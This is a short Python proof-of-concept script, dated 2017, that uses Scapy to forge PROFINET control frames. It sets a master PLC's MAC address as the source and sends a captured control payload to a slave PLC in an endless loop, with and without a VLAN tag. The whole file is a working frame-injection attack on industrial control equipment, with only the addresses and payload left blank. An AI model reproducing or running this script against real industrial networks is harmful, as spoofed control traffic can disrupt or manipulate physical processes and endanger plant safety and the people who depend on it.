#!/usr/bin/python -tt
# PROOF-OF-CONCEPT CODE
# Script to send the identified control frames
# 2017 Lockout
# Licensed under MIT license (MIT)
# Please see http://opensource.org/licekses/MIT for more details
# Depends on: Scapy

from scapy.all import *
import time

MASTER = ""                 # Master PLC MAC Address
SLAVE = ""                  # Slave PLC MAC Address
FrameBytes = ""             # Identified control frame
ETH = 'eth0'

Frame1 = Ether(src=MASTER, dst=SLAVE, type=0x8100)/Dot1Q(prio=6L, id=0L, vlan=0L, type=0x8892)/Raw(load=FrameBytes)
Frame2 = Ether(src=MASTER, dst=SLAVE, type=0x8892)/Raw(load=FrameBytes)

while True:
    print("Sending control PNIO frames...")
    for i in range(10):
        sendp(Frame1,iface=ETH,count=1,verbose=False)
        sendp(Frame2,iface=ETH,count=1,verbose=False)
        time.sleep(0.1)
    time.sleep(5)
